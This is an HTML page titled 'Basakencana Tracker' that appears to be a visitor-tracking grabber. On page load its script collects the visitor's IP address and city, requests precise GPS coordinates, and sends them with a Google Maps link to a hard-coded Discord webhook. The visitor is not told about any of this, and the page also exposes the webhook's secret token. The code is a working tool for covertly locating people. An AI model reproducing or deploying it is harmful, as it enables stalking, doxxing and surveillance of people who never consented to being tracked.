<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basakencana Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { margin: 0; background: black; color: #0F0; font-family: monospace; overflow: hidden; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        #info { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(0,0,0,0.9); padding: 20px; border: 2px solid #0F0; border-radius: 8px; width: 320px; z-index: 10; }
        #map { height: 200px; width: 100%; margin-top: 15px; border: 1px solid #0F0; border-radius: 4px; background: #111; }
    </style>
</head>
<body>

<div id="info">
    <h2>BASAKENCANA SYSTEM</h2>
    <p id="status">Scanning...</p>
    <p id="ip"></p>
    <p id="location"></p>
    <div id="map"></div>
</div>

<canvas id="matrix"></canvas>
<script>
// Webhook Baru
const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";

async function trackVisitor() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // Gunakan backtick ( ` ) bukan kutip biasa ( ' )
                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                await sendToDiscord(data, mLink, "🎯 GPS (PRESISI)");
            }, async () => {
                const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                await sendToDiscord(data, mLink, "☁️ IP (ESTIMASI)");
            });
        }
    } catch (err) { console.error(err); }
}

async function sendToDiscord(data, mapsLink, metode) {
    // Format JSON yang paling simpel untuk teks biasa + emoticon
    const payload = {
        username: "BASAKENCANA TRACKER",
        content: `🚨 **PENGUNJUNG TERDETEKSI!**\n━━━━━━` + `━━━━━━━━\n` +
                 `🌐 **IP Address:** ${data.ip}\n` +
                 `🏙️ **Kota:** ${data.city}, ${data.region}\n` +
                 `🎯 **Metode:** ${metode}\n` +
                 `🗺️ **Google Maps:** [Klik di Sini](${mapsLink})\n` + 
                 `━━━━━━━━━━` + `━━━━━━━━`
    };

    // Mengirim ke Discord
    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        console.log("Notifikasi Terkirim ke Discord!");
    } catch (e) { console.error("Gagal mengirim ke Discord:", e); }
}

trackVisitor();
</script>
</body>
</html>
